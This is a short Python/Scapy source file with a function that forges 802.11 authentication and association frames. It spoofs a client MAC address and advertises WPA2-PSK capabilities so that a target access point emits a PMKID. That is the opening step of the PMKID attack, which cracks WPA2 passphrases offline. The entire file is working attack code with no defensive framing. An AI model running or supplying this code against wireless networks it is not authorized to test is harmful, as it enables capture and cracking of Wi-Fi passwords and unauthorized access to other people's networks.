import time
from scapy.all import sendp
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Auth, Dot11AssoReq, Dot11Elt
from channel import set_channel

def trigger_pmkid(interface, bssid, client_mac, ssid, channel):
    set_channel(interface, channel)
    
    auth_req = RadioTap() / Dot11(type=0, subtype=11, addr1=bssid, addr2=client_mac, addr3=bssid) / \
               Dot11Auth(algo=0, seqnum=1, status=0)

    dot11_assoc = Dot11(type=0, subtype=0, addr1=bssid, addr2=client_mac, addr3=bssid)

    # capability flag    
    assoc_req = Dot11AssoReq(cap=0x3104, listen_interval=5)
    
    # info tags
    essid_ie = Dot11Elt(ID="SSID", info=ssid.encode())
    
    # supported rates
    rates_ie = Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96\x8c\x12\x98\x24")
    
    # declare WPA2-PSK (AES-CCMP) capabilities
    rsn_hex = "0100000fac040100000fac040100000fac028000"
    rsn_ie = Dot11Elt(ID=48, info=bytes.fromhex(rsn_hex))
    
    # final association frame
    assoc_frame = RadioTap() / dot11_assoc / assoc_req / essid_ie / rates_ie / rsn_ie

    print(f'({interface}) Sending authentication request to {ssid}.')
    sendp(auth_req, iface=interface, count=1, verbose=False)
    
    time.sleep(0.1)

    print(f'({interface}) Sending association request to {ssid}.')
    sendp(assoc_frame, iface=interface, count=1, verbose=False)
